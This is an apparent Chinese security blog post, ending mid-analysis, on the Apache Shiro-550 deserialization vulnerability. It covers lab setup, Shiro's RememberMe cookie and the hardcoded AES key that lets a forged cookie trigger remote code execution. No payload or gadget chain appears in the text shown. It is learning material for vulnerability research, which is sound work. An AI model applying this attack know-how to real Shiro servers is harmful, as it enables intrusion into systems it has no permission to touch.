<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>java安全-shiro550漏洞 | 十七.</title><meta name="author" content="chuanchuan"><meta name="copyright" content="chuanchuan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="java安全中shiro反序列化漏洞，编写了URLDNS链与CC11链">
<meta property="og:type" content="article">
<meta property="og:title" content="java安全-shiro550漏洞">
<meta property="og:url" content="https://zc-18.github.io/2026/02/16/shiro550/index.html">
<meta property="og:site_name" content="十七.">
<meta property="og:description" content="java安全中shiro反序列化漏洞，编写了URLDNS链与CC11链">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png">
<meta property="article:published_time" content="2026-02-16T10:00:02.000Z">
<meta property="article:modified_time" content="2026-02-16T09:49:22.277Z">
<meta property="article:author" content="chuanchuan">
<meta property="article:tag" content="java安全">
<meta property="article:tag" content="shiro漏洞">
<meta property="article:tag" content="反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "java安全-shiro550漏洞",
  "url": "https://zc-18.github.io/2026/02/16/shiro550/",
  "image": "https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png",
  "datePublished": "2026-02-16T10:00:02.000Z",
  "dateModified": "2026-02-16T09:49:22.277Z",
  "author": [
    {
      "@type": "Person",
      "name": "chuanchuan",
      "url": "https://zc-18.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan1.png"><link rel="canonical" href="https://zc-18.github.io/2026/02/16/shiro550/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3-b2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?e6047011fc3df8f4b86d7847de988e6d";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();
btf.addGlobalFn('pjaxComplete', () => {
  _hmt.push(['_trackPageview',window.location.pathname])
}, 'baidu_analytics')
</script><link rel="stylesheet" href="/%3Clink%20rel=%22stylesheet%22%20href=%22https:/fonts.googleapis.com/css2?family=Poppins:wght@700&amp;family=Noto+Serif+SC:wght@700&amp;display=swap%22%3E" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":false,"highlightLang":false,"highlightHeightLimit":380,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'java安全-shiro550漏洞',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="gear-loader"><div class="gear-loader_overlay"></div><div class="gear-loader_cogs"><div class="gear-loader_cogs__top"><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_hole"></div></div><div class="gear-loader_cogs__left"><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_hole"></div></div><div class="gear-loader_cogs__bottom"><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_hole"></div></div></div></div></div><script>(() => {
  const box = document.getElementById('loading-box')
  const body = document.body

  let start = Date.now() // 动画开始时间

  const end = () => {
    const elapsed = Date.now() - start
    const minDelay = Math.max(0, 1000 - elapsed) // 保证最少 1 秒

    setTimeout(() => {
      body.style.overflow = ''
      box.classList.add('loaded')
    }, minDelay)
  }

  // ===== 最多 3 秒强制结束 =====
  const maxTimer = setTimeout(end, 3000)

  // 页面加载完结束
  if (document.readyState === 'complete') {
    clearTimeout(maxTimer)
    end()
  } else {
    window.addEventListener('load', () => {
      clearTimeout(maxTimer)
      end()
    })
  }

  // ===== PJAX 支持 =====
  if (true) {
    btf.addGlobalFn(
      'pjaxSend',
      () => {
        body.style.overflow = 'hidden'
        box.classList.remove('loaded')
        start = Date.now() // 重新计时
        clearTimeout(maxTimer)
        setTimeout(end, 3000) // PJAX 同样最多 3 秒
      },
      'gear_init'
    )
    btf.addGlobalFn('pjaxComplete', () => {
      clearTimeout(maxTimer)
      end()
    }, 'gear_end')
  }
})()</script><div class="bg-animation" id="web_bg" style="background-color: #efefef;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan1.png" alt="Logo"><span class="site-name">十七.</span></a><a class="nav-page-title" href="/"><span class="site-name">java安全-shiro550漏洞</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">java安全-shiro550漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-16T10:00:02.000Z" title="发表于 2026-02-16 18:00:02">2026-02-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-16T09:49:22.277Z" title="更新于 2026-02-16 17:49:22">2026-02-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/shiro%E6%BC%8F%E6%B4%9E/">shiro漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">5.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="java安全-shiro-550漏洞"><a href="#java安全-shiro-550漏洞" class="headerlink" title="java安全-shiro 550漏洞"></a>java安全-<code>shiro</code> 550漏洞</h1><h2 id="一、项目搭建"><a href="#一、项目搭建" class="headerlink" title="一、项目搭建"></a>一、项目搭建</h2><h3 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jdk8u65</span><br><span class="line"></span><br><span class="line">tomcat8.5.31</span><br><span class="line">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.81/bin/apache-tomcat-8.5.81-windows-x64.zip</span><br></pre></td></tr></table></figure>

<p>项目为 P 神开源<code>shiro</code>项目</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/phith0n/JavaThings.git</span><br></pre></td></tr></table></figure>

<p><code>git clone</code>即可</p>
<h3 id="2-搭建"><a href="#2-搭建" class="headerlink" title="2.搭建"></a>2.搭建</h3><p><code>idea</code>加载<code>shiro\JavaThings\shirodemo</code>该项目</p>
<p>切换<code>jdk</code>版本</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141125135.png" alt="image-20260214112514774" style="zoom: 50%;" />

<p>配置<code>tomcat</code>服务器，设置打开</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141127650.png" alt="image-20260214112730589" style="zoom:50%;" />

<p>配置项目工件</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141129779.png" alt="image-20260214112933722" style="zoom: 50%;" />

<p>配置项目设置</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141131120.png" alt="image-20260214113102011" style="zoom: 33%;" />

<p>在<code>tomcat</code>中将工件添加</p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141133952.png" alt="image-20260214113304806" style="zoom:50%;" />

<p><strong>然后点击右上角运行即可</strong></p>
<h2 id="二、shiro学习"><a href="#二、shiro学习" class="headerlink" title="二、shiro学习"></a>二、<code>shiro</code>学习</h2><p><code>shrio</code>自动处理登录</p>
<p>具体流程</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──────────────────────────────────────────────────────────────────┐</span><br><span class="line">│                     Shiro 自动处理登录流程                         │</span><br><span class="line">└──────────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line">  1. 用户访问 /login.jsp (GET)</span><br><span class="line">     │</span><br><span class="line">     ▼</span><br><span class="line">  ┌─────────────────────────────────────┐</span><br><span class="line">  │  shiro.ini 配置:                     │</span><br><span class="line">  │  /login.jsp = authc                 │</span><br><span class="line">  │                                     │</span><br><span class="line">  │  authc = FormAuthenticationFilter   │</span><br><span class="line">  │  (表单认证过滤器)                     │</span><br><span class="line">  └─────────────────────────────────────┘</span><br><span class="line">     │</span><br><span class="line">     ▼</span><br><span class="line">  2. 用户填写表单，点击 Sign in</span><br><span class="line">     │</span><br><span class="line">     ▼</span><br><span class="line">  3. 浏览器发送 POST /login.jsp</span><br><span class="line">     │</span><br><span class="line">     ├── username=root</span><br><span class="line">     ├── password=secret</span><br><span class="line">     └── rememberMe=on (如果勾选)</span><br><span class="line">     │</span><br><span class="line">     ▼</span><br><span class="line">  ┌─────────────────────────────────────┐</span><br><span class="line">  │  FormAuthenticationFilter 自动:      │</span><br><span class="line">  │                                     │</span><br><span class="line">  │  1. 检测到是 POST 请求               │</span><br><span class="line">  │  2. 自动读取 username 参数           │</span><br><span class="line">  │  3. 自动读取 password 参数           │</span><br><span class="line">  │  4. 自动读取 rememberMe 参数         │</span><br><span class="line">  │  5. 调用 Shiro 进行认证              │</span><br><span class="line">  └─────────────────────────────────────┘</span><br><span class="line">     │</span><br><span class="line">     ▼</span><br><span class="line">  ┌─────────────────────────────────────┐</span><br><span class="line">  │  Shiro 认证过程:                     │</span><br><span class="line">  │                                     │</span><br><span class="line">  │  对比 shiro.ini 中的用户:            │</span><br><span class="line">  │  root = secret,admin   ← 匹配！     │</span><br><span class="line">  │  guest = guest,guest               │</span><br><span class="line">  └─────────────────────────────────────┘</span><br><span class="line">     │</span><br><span class="line">     ├── 认证成功 → 跳转到首页 (index.jsp)</span><br><span class="line">     │</span><br><span class="line">     └── 认证失败 → 停留在 login.jsp，显示错误</span><br></pre></td></tr></table></figure>

<h3 id="1-shiro功能"><a href="#1-shiro功能" class="headerlink" title="1.shiro功能"></a>1.<code>shiro</code>功能</h3><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><p>这是最基础的功能。用户在登录页面输入用户名和密码，Shiro 负责拿着这些信息去数据库（通过 <strong>Realm</strong>，你可以理解为保安手中的花名册）里比对。</p>
<ul>
<li><p><strong>代码里长这样：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Subject</span> <span class="variable">currentUser</span> <span class="operator">=</span> SecurityUtils.getSubject();</span><br><span class="line"><span class="type">UsernamePasswordToken</span> <span class="variable">token</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordToken</span>(<span class="string">&quot;xiaochuan&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">currentUser.login(token); <span class="comment">// 这一行就在查户口</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><p>用户登录成功了，但他是个普通员工还是管理员？</p>
<ul>
<li><strong>场景</strong>：普通用户只能看“我的订单”，管理员能看“所有订单”和“删除订单”。</li>
<li>Shiro 会在代码里帮你做判断，比如 <code>@RequiresRoles(&quot;admin&quot;)</code>，如果用户没这个角色，Shiro 直接抛异常，不让你通过。</li>
</ul>
<h4 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h4><ul>
<li><strong>Web 环境</strong>：通常用 Tomcat 自带的 Session。但 Shiro 自己实现了一套 Session 机制。</li>
<li><strong>牛在哪？</strong>：即使你的应用<strong>不是 Web 应用</strong>（比如是一个简单的 Java 命令行工具），Shiro 也能让你使用 Session！这在分布式系统中非常有用（比如把 Session 存到 Redis 里）。</li>
</ul>
<h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><ul>
<li>Shiro 提供了一套非常简单的加密工具，帮你做 MD5、SHA-256 哈希，或者 AES 加密（就是你最开始问的那个 Key 的用途）。它比 Java 原生的加密 API 好用太多了。</li>
</ul>
<h3 id="2-shiro与Jwt"><a href="#2-shiro与Jwt" class="headerlink" title="2.shiro与Jwt"></a>2.<code>shiro</code>与<code>Jwt</code></h3><p><strong>Shiro <code>RememberMe</code> (传统 Cookie 模式)</strong></p>
<ul>
<li><strong>核心思想</strong>：<strong>信任服务器</strong>。</li>
<li><strong>做法</strong>：服务器把用户信息（Java 对象）打包、加密、扔给浏览器。浏览器只负责保管这串“乱码”，看不懂里面是啥。</li>
<li><strong>数据格式</strong>：<strong>二进制</strong>（Java 序列化数据）。</li>
<li><strong>状态</strong>：<strong>有状态 (Stateful)</strong>。服务器拿到 Cookie 后，通常还需要去数据库或内存（Session）里查一下这个用户现在的状态（有没有被封号）。</li>
</ul>
<p><strong>JWT (Token 模式)</strong></p>
<ul>
<li><strong>核心思想</strong>：<strong>信任签名</strong>。</li>
<li><strong>做法</strong>：服务器把用户信息写成 <strong>JSON</strong>（比如 <code>{&quot;user&quot;: &quot;xiaochuan&quot;, &quot;role&quot;: &quot;admin&quot;}</code>），用密钥签个名，扔给浏览器。浏览器可以看到里面的内容（Base64 解码即可）。</li>
<li><strong>数据格式</strong>：<strong>文本</strong>（JSON 字符串）。</li>
<li><strong>状态</strong>：<strong>无状态 (Stateless)</strong>。服务器拿到 Token，算出签名对不对。如果对，就无条件信任里面的信息（甚至不需要查数据库）。</li>
</ul>
<table>
<thead>
<tr>
<th><strong>特性</strong></th>
<th><strong>Shiro RememberMe</strong></th>
<th align="left"><strong>JWT (JSON Web Token)</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>致命漏洞</strong></td>
<td><strong>反序列化 RCE</strong> (远程代码执行)</td>
<td align="left"><strong>算法缺陷 &#x2F; 密钥泄露</strong></td>
</tr>
<tr>
<td><strong>攻击原理</strong></td>
<td>黑客修改 Cookie 内容，服务器<strong>反序列化</strong>时执行了恶意代码。这是<strong>系统级</strong>的沦陷。</td>
<td align="left">黑客修改 JSON 内容（比如把 <code>role: user</code> 改成 <code>role: admin</code>），如果密钥泄露或算法被篡改为 <code>None</code>，服务器就会信以为真。这是<strong>逻辑级</strong>的越权。</td>
</tr>
<tr>
<td><strong>数据可见性</strong></td>
<td><strong>不可见</strong>（加密的）。黑客默认看不懂 Cookie 里存了啥。</td>
<td align="left"><strong>可见</strong>（仅 Base64 编码）。黑客可以直接解码看到 Payload 里的用户信息。</td>
</tr>
<tr>
<td><strong>密钥的作用</strong></td>
<td>用于 AES <strong>解密</strong>。不知道密钥就无法构造 Payload。</td>
<td align="left">用于 HMAC <strong>签名</strong>。不知道密钥就无法伪造合法的 Token。</td>
</tr>
</tbody></table>
<h3 id="3-shiro进行会话管理"><a href="#3-shiro进行会话管理" class="headerlink" title="3.shiro进行会话管理"></a>3.<code>shiro</code>进行会话管理</h3><h4 id="普通的-Session-ID"><a href="#普通的-Session-ID" class="headerlink" title="普通的 Session ID"></a>普通的 Session ID</h4><ul>
<li><strong>场景</strong>：你登录后，没有关闭浏览器，一直在点击页面。</li>
<li><strong>Cookie 名字</strong>：通常叫 <code>JSESSIONID</code> (Tomcat默认) 或 <code>SID</code> (Shiro默认)。</li>
<li><strong>内容是啥？</strong>：<strong>它仅仅是一个随机字符串（乱码 ID）</strong>，比如 <code>1a2b3c4d...</code>。</li>
<li><strong>有没有加密？</strong>：<strong>没有！</strong> 它不需要用那个 AES 密钥加密。它就是一个单纯的“门牌号”。</li>
<li><strong>原理</strong>：<ol>
<li>浏览器发来 <code>JSESSIONID=1a2b3c</code>。</li>
<li>Shiro&#x2F;Tomcat 拿着这个号码去 <strong>内存（或 Redis）</strong> 里找。</li>
<li>找到了 -&gt; 确认你是小川 -&gt; 放行。</li>
</ol>
</li>
</ul>
<h4 id="记住我-Cookie"><a href="#记住我-Cookie" class="headerlink" title="记住我 Cookie"></a>记住我 Cookie</h4><ul>
<li><strong>场景</strong>：你勾选了“记住我”，然后关闭浏览器，第二天再来。</li>
<li><strong>Cookie 名字</strong>：通常叫 <code>rememberMe</code>。</li>
<li><strong>内容是串被加密的长字符串！</strong></li>
<li><strong>原理</strong>：<ol>
<li>你登录时，Shiro 把你的<strong>用户信息（User对象）</strong> 序列化 -&gt; <strong>AES加密 (用那个 Key)</strong> -&gt; Base64 编码。</li>
<li>生成的这一大坨东西，塞给浏览器存着。</li>
<li>第二天你来了，浏览器把这一大坨东西发给服务器。</li>
<li>服务器用 <strong>Key 解密</strong> -&gt; 反序列化 -&gt; 恢复出“你是小川”。</li>
</ol>
</li>
<li><strong>风险</strong>：<strong>只有这个 Cookie 才会导致反序列化漏洞（RCE）</strong>。</li>
</ul>
<h2 id="三、shiro550"><a href="#三、shiro550" class="headerlink" title="三、shiro550"></a>三、<code>shiro</code>550</h2><p>这里主要利用了会话管理的第二种方式<strong>记住我 Cookie</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141511714.png" alt="image-20260214151122620"></p>
<p>这一串字符将会在没有<code>sessionId</code>时作为<strong>凭据</strong>可以获取<code>sessionId</code>，因为自然登录时存储的<code>sessionId</code>只是会话时的，只有当前浏览器会话使用，关闭浏览器即销毁，而这个<code>rememberMe</code>字串可以在没有<code>sessionId</code>时进行登录功能实现，原意是好的，但是服务器在解析<code>rememberMe</code>字串时，会反序列化其，获取用户信息，这就导致了反序列化链条的使用！</p>
<p>但Shiro1.2.4 及之前的版本中，AES 加密的密钥默认<strong>硬编码</strong>在代码里这也就导致了<code>Shiro-550</code></p>
<h3 id="1-服务端解密过程"><a href="#1-服务端解密过程" class="headerlink" title="1.服务端解密过程"></a>1.服务端解密过程</h3><ul>
<li><p>加密密钥<code>key</code>配置过程</p>
<p><code>org/apache/shiro/mgt/AbstractRememberMeManager.java</code>中<code>AbstractRememberMeManager</code>构造方法，为<code>decryptionCipherKey</code>赋值定值<code>DEFAULT_CIPHER_KEY_BYTES</code></p>
<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141741093.png" alt="image-20260214174133035" style="zoom: 50%;" />

<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141738511.png" alt="image-20260214173841447" style="zoom:50%;" /></li>
</ul>
<p><strong>解密全过程</strong></p>
<p><strong>入口：<code>AbstractShiroFilter</code></strong></p>
<p>当一个请求（比如访问首页 <code>/index</code>）到达 Tomcat 时，首先会被 Shiro 的过滤器拦截</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstractShiroFilter.java</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 对于每个请求，Shiro 都要创建一个 Subject 对象（代表当前用户）</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> createSubject(request, response);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 继续后续处理...</span></span><br><span class="line">    subject.execute(<span class="keyword">new</span> <span class="title class_">Callable</span>() &#123; ... &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>委托给 SecurityManager</strong></p>
<p>中间人：<code>WebSubject.Builder</code></p>
<p>过滤器不知道怎么创建用户，它委托给 <code>SecurityManager</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Subject.Builder.java</span></span><br><span class="line"><span class="keyword">public</span> Subject <span class="title function_">buildSubject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 调用 SecurityManager 来创建 Subject</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.securityManager.createSubject(<span class="built_in">this</span>.subjectContext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602141753296.png" alt="image-20260214175326228"></p>
<p><strong>尝试解析身份</strong></p>
<p>核心大脑：<code>DefaultSecurityManager</code></p>
<p>这是最关键的一步！<code>SecurityManager</code> 需要决定这个用户是谁。</p>
